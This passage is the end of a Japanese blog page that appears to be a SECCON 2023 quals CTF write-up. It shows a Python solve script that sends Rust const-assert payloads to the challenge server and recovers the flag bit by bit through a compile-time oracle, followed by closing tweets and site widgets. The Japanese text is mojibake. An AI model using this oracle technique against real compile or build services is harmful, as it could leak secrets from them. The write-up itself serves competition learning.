</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> len(b4) <span style="color:#f92672">+</span> <span style="color:#ae81ff">512</span> <span style="color:#f92672">+</span> af<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;__FLAG__&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SECCON{&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>    byte <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> bit <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">7</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>):
</span></span><span style="display:flex;"><span>        p <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        p <span style="color:#f92672">+=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;const _: () = assert!(include_bytes!(file!())[</span><span style="color:#e6db74">{</span>offset <span style="color:#f92672">+</span> len(flag)<span style="color:#e6db74">}</span><span style="color:#e6db74">] &gt;= </span><span style="color:#e6db74">{</span>byte <span style="color:#f92672">|</span> (<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> bit)<span style="color:#e6db74">}</span><span style="color:#e6db74">);&#34;</span>
</span></span><span style="display:flex;"><span>        p <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34; &#34;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">511</span> <span style="color:#f92672">-</span> len(p))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">assert</span> len(p) <span style="color:#f92672">==</span> <span style="color:#ae81ff">511</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#r = process(argv = [&#34;python&#34;, &#34;app.py&#34;], env = {&#34;FLAG&#34;: &#34;SECCON{abcdefg}&#34;, &#34;PATH&#34;: os.environ[&#34;PATH&#34;]})</span>
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;crabox.seccon.games&#34;</span>, <span style="color:#ae81ff">1337</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#print(p)</span>
</span></span><span style="display:flex;"><span>        r<span style="color:#f92672">.</span>sendline(p<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>        r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;__EOF__&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>decode()
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#print(result)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;:)&#34;</span> <span style="color:#f92672">in</span> result:
</span></span><span style="display:flex;"><span>            byte <span style="color:#f92672">|=</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> bit
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> <span style="color:#e6db74">&#34;:(&#34;</span> <span style="color:#f92672">in</span> result:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">pass</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">raise</span> <span style="color:#e6db74">&#34;fail&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        r<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>    flag <span style="color:#f92672">+=</span> chr(byte)
</span></span><span style="display:flex;"><span>    print(flag)
</span></span></code></pre></div><h2 id="ãŠã‚ã‚Š">ãŠã‚ã‚Š</h2>
<p>æˆ’ã‚:
<blockquote class="twitter-tweet"><p lang="ja" dir="ltr">è‡ªåˆ†ã¸ã®æˆ’ã‚ã®ãŸã‚ã«æ¥ãšã‹ã—ã™ãã‚‹ã‚¹ã‚³ã‚¢ãƒœãƒ¼ãƒ‰ã‚’æ™’ã—ã¦ãŠãã¾ã™ <a href="https://t.co/bIclTUVDx6">pic.twitter.com/bIclTUVDx6</a></p>&mdash; Kazutoshi Noguchi (@n_g_k_z) <a href="https://twitter.com/n_g_k_z/status/1703276281159458847?ref_src=twsrc%5Etfw">September 17, 2023</a></blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

</p>
<p>å®Œå…¨ã«å¿˜ã‚Œã¦ã¾ã—ãŸ:
<blockquote class="twitter-tweet"><p lang="ja" dir="ltr">rev/pwnæ‹…å½“ã ã£ãŸã‚¯ã‚»ã«ãã‚Œãã‚Œ2å•ã—ã‹è§£ã‘ã¦ãªã„ã®ã€æ¥ãšã‹ã—ã™ãã‚‹ã§ã—ã‚‡<br>warmupå•é¡Œã§ã™ã‚‰çµ¶å¯¾æƒ³å®šè§£ã˜ã‚ƒãªã„ã§ã—ã‚‡ã£ã¦ãã‚‰ã„å¤‰ãªãƒšã‚¤ãƒ­ãƒ¼ãƒ‰æ›¸ã‹ãªã„ã¨è§£ã‘ãªã‹ã£ãŸã—ã€å‹˜æ‰€ã‚’å¿˜ã‚Œã¦ã‚‹æ°—ãŒã™ã‚‹</p>&mdash; Kazutoshi Noguchi (@n_g_k_z) <a href="https://twitter.com/n_g_k_z/status/1703276979536240869?ref_src=twsrc%5Etfw">September 17, 2023</a></blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

</p>
<p>æ›¸ã„ã¦ã‚‹é€”ä¸­ã«å—ä¿¡ã—ãŸé›»æ³¢:<br>
<code>writeup</code>ã£ã¦ç›´è¨³ã™ã‚‹ã¨<code>ã‹ãã‚ã’</code>ã ã‚ˆã­</p>
<p>ã“ã“ã¾ã§èª­ã‚“ã¦ãã‚Œã¦ã‚ã‚ŠãŒã¨ã†ã­ã€‚


 
  
  
  
  
    
      
    
  
    
  
    
      
    
  

<div class="figure center nocaption" >
  
    <a class="fancybox" href="satsuki.jpg" title="ã•ã¤ã" data-fancybox="">
  
    <img class="fig-img" src="satsuki.jpg" style="width: 512px;" alt="ã•ã¤ã">
  
    </a>
  
  
</div>
</p>
              


            </div>
          </div>
          <div id="post-footer" class="post-footer main-content-wrap">
            
              
                
                
                  <div class="post-footer-tags">
                    <span class="text-color-light text-small">ã‚¿ã‚°</span><br/>
                    
  <a class="tag tag--primary tag--small" href="https://f2l.cc/tags/seccon/">SECCON</a>

                  </div>
                
              
            
            
<div class="post-actions-wrap">
  <nav >
    <ul class="post-actions post-action-nav">
      
        <li class="post-action">
          
            <a class="post-action-btn btn btn--default tooltip--top" href="https://f2l.cc/2023/11/infinitime-japanese/" data-tooltip="PineTimeã‚’æ—¥æœ¬èªå¯¾å¿œã«ã™ã‚‹å›" aria-label="æ¬¡: PineTimeã‚’æ—¥æœ¬èªå¯¾å¿œã«ã™ã‚‹å›">
          
              <i class="fa fa-angle-left"></i>
              <span class="hide-xs hide-sm text-small icon-ml">æ¬¡</span>
            </a>
        </li>
        <li class="post-action">
          
            <a class="post-action-btn btn btn--default tooltip--top" href="https://f2l.cc/2023/06/diff-oil-change/" data-tooltip="ãƒã‚¤ã‚¼ãƒƒãƒˆã‚«ãƒ¼ã‚´(S331Vå¾ŒæœŸ) å‰å¾Œãƒ‡ãƒ•ã‚ªã‚¤ãƒ«äº¤æ›" aria-label="å‰: ãƒã‚¤ã‚¼ãƒƒãƒˆã‚«ãƒ¼ã‚´(S331Vå¾ŒæœŸ) å‰å¾Œãƒ‡ãƒ•ã‚ªã‚¤ãƒ«äº¤æ›">
          
              <span class="hide-xs hide-sm text-small icon-mr">å‰</span>
              <i class="fa fa-angle-right"></i>
            </a>
        </li>
      
    </ul>
  </nav>
<ul class="post-actions post-action-share" >
  
    <li class="post-action hide-lg hide-md hide-sm">
      <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="ã“ã®è¨˜äº‹ã‚’å…±æœ‰ã™ã‚‹">
        <i class="fa fa-share-alt" aria-hidden="true"></i>
      </a>
    </li>
    
      <li class="post-action hide-xs">
        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://f2l.cc/2023/09/seccon-2023-quals-writeup/" title="Facebookã§å…±æœ‰" aria-label="Facebookã§å…±æœ‰">
          <i class="fab fa-facebook-square" aria-hidden="true"></i>
        </a>
      </li>
    
      <li class="post-action hide-xs">
        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://f2l.cc/2023/09/seccon-2023-quals-writeup/" title="Twitterã§å…±æœ‰" aria-label="Twitterã§å…±æœ‰">
          <i class="fab fa-twitter" aria-hidden="true"></i>
        </a>
      </li>
    
      <li class="post-action hide-xs">
        <a class="post-action-btn btn btn--default" target="new" href="https://www.reddit.com/submit?url=https://f2l.cc/2023/09/seccon-2023-quals-writeup/" title="Redditã§å…±æœ‰" aria-label="Redditã§å…±æœ‰">
          <i class="fab fa-reddit" aria-hidden="true"></i>
        </a>
      </li>
    
      <li class="post-action hide-xs">
        <a class="post-action-btn btn btn--default" target="new" href="https://news.ycombinator.com/submitlink?u=https://f2l.cc/2023/09/seccon-2023-quals-writeup/" title="Hacker Newsã§å…±æœ‰" aria-label="Hacker Newsã§å…±æœ‰">
          <i class="fab fa-hacker-news" aria-hidden="true"></i>
        </a>
      </li>
    
  
  
    <li class="post-action">
      <a class="post-action-btn btn btn--default" href="#disqus_thread" aria-label="ã‚³ãƒ¡ãƒ³ãƒˆã‚’æ®‹ã™">
        <i class="far fa-comment"></i>
      </a>
    </li>
  
  <li class="post-action">
    
      <a class="post-action-btn btn btn--default" href="#top" aria-label="ãƒˆãƒƒãƒ—ã«æˆ»ã‚‹">
      <i class="fa fa-arrow-up" aria-hidden="true"></i>
    
    </a>
  </li>
</ul>
</div>


            
  
    <div id="disqus_thread">
      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
    </div>
    <script type="text/javascript">
      var disqus_config = function() {
        this.page.url = 'https:\/\/f2l.cc\/2023\/09\/seccon-2023-quals-writeup\/';
        
          this.page.identifier = '\/2023\/09\/seccon-2023-quals-writeup\/'
        
      };
      (function() {
        
        
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
          document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
          return;
        }
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        var disqus_shortname = 'ngkz-log';
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
      })();
    </script>
  


          </div>
        </article>
        <footer id="footer" class="main-content-wrap">
  <span class="copyrights">
      <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-sa/4.0/80x15.png" /></a><br /><span xmlns:dct="http://purl.org/dc/terms/" property="dct:title">FÂ²L</span> by <a xmlns:cc="http://creativecommons.org/ns#" href="https://f2l.cc/" property="cc:attributionName" rel="cc:attributionURL">Kazutoshi Noguchi</a> is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International License</a>. Cover image by <a href="https://www.goodfreephotos.com/">Good Free Photos</a>.
  </span>
</footer>

      </div>
      <div id="bottom-bar" class="post-bottom-bar" data-behavior="1">
        
<div class="post-actions-wrap">
  <nav >
    <ul class="post-actions post-action-nav">
      
        <li class="post-action">
          
            <a class="post-action-btn btn btn--default tooltip--top" href="https://f2l.cc/2023/11/infinitime-japanese/" data-tooltip="PineTimeã‚’æ—¥æœ¬èªå¯¾å¿œã«ã™ã‚‹å›" aria-label="æ¬¡: PineTimeã‚’æ—¥æœ¬èªå¯¾å¿œã«ã™ã‚‹å›">
          
              <i class="fa fa-angle-left"></i>
              <span class="hide-xs hide-sm text-small icon-ml">æ¬¡</span>
            </a>
        </li>
        <li class="post-action">
          
            <a class="post-action-btn btn btn--default tooltip--top" href="https://f2l.cc/2023/06/diff-oil-change/" data-tooltip="ãƒã‚¤ã‚¼ãƒƒãƒˆã‚«ãƒ¼ã‚´(S331Vå¾ŒæœŸ) å‰å¾Œãƒ‡ãƒ•ã‚ªã‚¤ãƒ«äº¤æ›" aria-label="å‰: ãƒã‚¤ã‚¼ãƒƒãƒˆã‚«ãƒ¼ã‚´(S331Vå¾ŒæœŸ) å‰å¾Œãƒ‡ãƒ•ã‚ªã‚¤ãƒ«äº¤æ›">
          
              <span class="hide-xs hide-sm text-small icon-mr">å‰</span>
              <i class="fa fa-angle-right"></i>
            </a>
        </li>
      
    </ul>
  </nav>
<ul class="post-actions post-action-share" >
  
    <li class="post-action hide-lg hide-md hide-sm">
      <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="ã“ã®è¨˜äº‹ã‚’å…±æœ‰ã™ã‚‹">
        <i class="fa fa-share-alt" aria-hidden="true"></i>
      </a>
    </li>
    
      <li class="post-action hide-xs">
        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://f2l.cc/2023/09/seccon-2023-quals-writeup/" title="Facebookã§å…±æœ‰" aria-label="Facebookã§å…±æœ‰">
          <i class="fab fa-facebook-square" aria-hidden="true"></i>
        </a>
      </li>
    
      <li class="post-action hide-xs">
        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://f2l.cc/2023/09/seccon-2023-quals-writeup/" title="Twitterã§å…±æœ‰" aria-label="Twitterã§å…±æœ‰">
          <i class="fab fa-twitter" aria-hidden="true"></i>
        </a>
      </li>
    
      <li class="post-action hide-xs">
        <a class="post-action-btn btn btn--default" target="new" href="https://www.reddit.com/submit?url=https://f2l.cc/2023/09/seccon-2023-quals-writeup/" title="Redditã§å…±æœ‰" aria-label="Redditã§å…±æœ‰">
          <i class="fab fa-reddit" aria-hidden="true"></i>
        </a>
      </li>
    
      <li class="post-action hide-xs">
        <a class="post-action-btn btn btn--default" target="new" href="https://news.ycombinator.com/submitlink?u=https://f2l.cc/2023/09/seccon-2023-quals-writeup/" title="Hacker Newsã§å…±æœ‰" aria-label="Hacker Newsã§å…±æœ‰">
          <i class="fab fa-hacker-news" aria-hidden="true"></i>
        </a>
      </li>
    
  
  
    <li class="post-action">
      <a class="post-action-btn btn btn--default" href="#disqus_thread" aria-label="ã‚³ãƒ¡ãƒ³ãƒˆã‚’æ®‹ã™">
        <i class="far fa-comment"></i>
      </a>
    </li>
  
  <li class="post-action">
    
      <a class="post-action-btn btn btn--default" href="#top" aria-label="ãƒˆãƒƒãƒ—ã«æˆ»ã‚‹">
      <i class="fa fa-arrow-up" aria-hidden="true"></i>
    
    </a>
  </li>
</ul>
</div>


      </div>
      
<div id="share-options-bar" class="share-options-bar" data-behavior="1">
  <i id="btn-close-shareoptions" class="fa fa-times"></i>
  <ul class="share-options">
    
      <li class="share-option">
        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Ff2l.cc%2F2023%2F09%2Fseccon-2023-quals-writeup%2F" aria-label="Facebookã§å…±æœ‰">
          <i class="fab fa-facebook-square" aria-hidden="true"></i><span>Facebookã§å…±æœ‰</span>
        </a>
      </li>
    
      <li class="share-option">
        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Ff2l.cc%2F2023%2F09%2Fseccon-2023-quals-writeup%2F" aria-label="Twitterã§å…±æœ‰">
          <i class="fab fa-twitter" aria-hidden="true"></i><span>Twitterã§å…±æœ‰</span>
        </a>
      </li>
    
      <li class="share-option">
        <a class="share-option-btn" target="new" href="https://www.reddit.com/submit?url=https%3A%2F%2Ff2l.cc%2F2023%2F09%2Fseccon-2023-quals-writeup%2F" aria-label="Redditã§å…±æœ‰">
          <i class="fab fa-reddit" aria-hidden="true"></i><span>Redditã§å…±æœ‰</span>
        </a>
      </li>
    
      <li class="share-option">
        <a class="share-option-btn" target="new" href="https://news.ycombinator.com/submitlink?u=https%3A%2F%2Ff2l.cc%2F2023%2F09%2Fseccon-2023-quals-writeup%2F" aria-label="Hacker Newsã§å…±æœ‰">
          <i class="fab fa-hacker-news" aria-hidden="true"></i><span>Hacker Newsã§å…±æœ‰</span>
        </a>
      </li>
    
  </ul>
</div>
<div id="share-options-mask" class="share-options-mask"></div>


    </div>
    
    <div id="about">
  <div id="about-card">
    <div id="about-btn-close">
      <i class="fa fa-times"></i>
    </div>
    
      <img id="about-card-picture" src="https://f2l.cc/insignia.png" alt="ãƒ—ãƒ­ãƒ•ã‚£ãƒ¼ãƒ«ç”»åƒ" />
    
    <h4 id="about-card-name">Kazutoshi Noguchi</h4>
    
      <div id="about-card-bio">ğŸˆğŸ§‘â€ğŸ’»ğŸš©ğŸ§â„ï¸âš¡ğŸšğŸ”§ğŸ’…ğŸ‘˜â¤ï¸ğŸ’œğŸ’™ğŸ¤</div>
    
    
      <div id="about-card-job">
        <i class="fa fa-briefcase"></i>
        <br/>
        Infomation Security Engineer
      </div>
    
    
      <div id="about-card-location">
        <i class="fa fa-map-marker-alt"></i>
        <br/>
        Japan
      </div>
    
  </div>
</div>

    

    
  
    
      <div id="cover" style="background-image:url('https://f2l.cc/images/cover.jpg');"></div>
    
  


    
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/highlight.min.js" integrity="sha512-z+/WWfyD5tccCukM4VvONpEtLmbAm5LDu7eKiyMQJ9m7OfPEDL7gENyDRL3Yfe8XAuGsS2fS4xSMnl6d30kqGQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha512-uURl+ZXMBrF4AwGaWmEetzrd+J5/8NRkWAvJx5sbPSSuOb0bZLqf+tOzniObO00BjHa/dD7gub9oCGMLPQHtQA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>


<script src="https://f2l.cc/js/script-yqzy9wdlzix4lbbwdnzvwx3egsne77earqmn73v9uno8aupuph8wfguccut.min.js"></script>



<script>
$(document).ready(function() {
  hljs.configure({ classPrefix: '', useBR: false });
  $('pre.code-highlight > code, pre > code').each(function(i, block) {
    if (!$(this).hasClass('codeblock')) {
      $(this).addClass('codeblock');
    }
    hljs.highlightBlock(block);
  });
});
</script>




    
  </body>
</html>

